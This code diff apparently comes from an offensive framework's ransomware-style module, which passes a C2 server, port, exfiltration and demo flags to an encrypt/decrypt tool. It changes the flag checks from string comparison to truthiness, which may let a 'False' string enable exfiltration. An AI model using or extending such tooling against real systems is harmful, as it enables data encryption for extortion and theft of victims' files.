@@ -20,9 +20,9 @@ class Module:
 
         if params["Mode"] == "Encrypt":
             args += f", '-s', '{params['C2Server']}', '-p', '{params['C2Port']}'"
-            if params.get("Exfiltrate") == "True":
+            if params.get("Exfiltrate"):
                 args += ", '-x'"
-            if params.get("Demo") == "True":
+            if params.get("Demo"):
                 args += ", '-demo'"
 
         elif params["Mode"] == "Decrypt":
